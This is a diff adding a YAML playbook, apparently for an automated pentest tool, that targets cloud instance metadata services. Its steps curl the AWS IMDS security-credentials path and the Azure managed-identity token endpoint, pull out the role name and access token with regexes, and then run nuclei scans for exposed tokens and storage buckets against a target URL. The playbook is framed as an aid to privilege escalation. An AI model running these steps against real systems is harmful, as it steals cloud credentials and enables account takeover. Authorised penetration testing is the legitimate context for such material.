@@ -1,0 +1,64 @@
+name: "Cloud IAM Enumeration & Privilege Escalation"
+description: "Enumerate cloud metadata endpoints (AWS/Azure/GCP IMDS), hunt for exposed cloud credentials, enumerate IAM roles and permissions, and chain to privilege escalation."
+category: cloud
+attack_vector: "IMDS/metadata abuse → IAM credential theft → privilege escalation"
+variables:
+  url:
+    required: true
+    description: "Target URL (web app that might proxy requests or host cloud metadata)"
+cutting_edge: true
+references: ["AWS IMDSv1 vs v2", "Azure Managed Identity abuse", "GCP metadata server"]
+
+steps:
+  - name: "aws_metadata_probe"
+    tool: "curl_request"
+    description: "Probe AWS IMDSv1 metadata endpoint for role credentials"
+    args:
+      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      method: "GET"
+      insecure: true
+    expected_output: "[A-Za-z0-9_-]+|AccessDenied|NotFound"
+    timeout: 60
+    gate: false
+    retries: 1
+    extracts:
+      - var: "iam_role"
+        regex: "([A-Za-z0-9_\\-]+)"
+
+  - name: "azure_imds_probe"
+    tool: "curl_request"
+    description: "Probe Azure Instance Metadata Service for managed identity token"
+    args:
+      url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      method: "GET"
+      headers: "Metadata: true"
+      insecure: true
+    expected_output: "access_token|error"
+    timeout: 60
+    gate: false
+    retries: 1
+    extracts:
+      - var: "azure_token"
+        regex: "\"access_token\"\\s*:\\s*\"([^\"]+)\""
+
+  - name: "cloud_cred_hunt"
+    tool: "nuclei_scan"
+    description: "Run nuclei cloud exposure templates (S3 buckets, storage, exposed dashboards)"
+    args:
+      target: "{{url}}"
+      templates: "http/exposures,http/misconfiguration"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
+
+  - name: "cloud_token_scan"
+    tool: "nuclei_scan"
+    description: "Scan for exposed cloud tokens, storage buckets and secrets via nuclei"
+    args:
+      target: "{{url}}"
+      templates: "exposures/tokens,http/exposures"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
